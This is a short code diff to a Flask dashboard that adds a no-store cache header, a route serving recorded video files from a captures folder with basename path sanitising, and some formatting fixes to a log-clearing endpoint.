-    return Response(DASH_HTML, mimetype='text/html')
+    return Response(DASH_HTML, mimetype='text/html', headers={'Cache-Control': 'no-store'})
 
 @dash_app.route('/api/captures')
 def api_captures():
     return Response(json.dumps(list(captures), default=str), mimetype='application/json')
 
+@dash_app.route('/captures/<path:fname>')
+def serve_capture(fname):
+    fpath = os.path.join(_DIR, 'captures', os.path.basename(fname))
+    if not os.path.isfile(fpath): return Response('', 404)
+    ext = fname.rsplit('.', 1)[-1]
+    mime = 'video/webm' if ext == 'webm' else 'video/mp4'
+    with open(fpath, 'rb') as fv:
+        return Response(fv.read(), mimetype=mime, headers={'Accept-Ranges': 'bytes'})
+
 @dash_app.route('/api/clear', methods=['POST'])
 def api_clear():
     captures.clear()
     try:
-        with open(LOG_FILE,'w') as f: json.dump([],f)
+        with open(LOG_FILE, 'w') as f: json.dump([], f)
     except Exception: pass
     return {'ok': True}
 
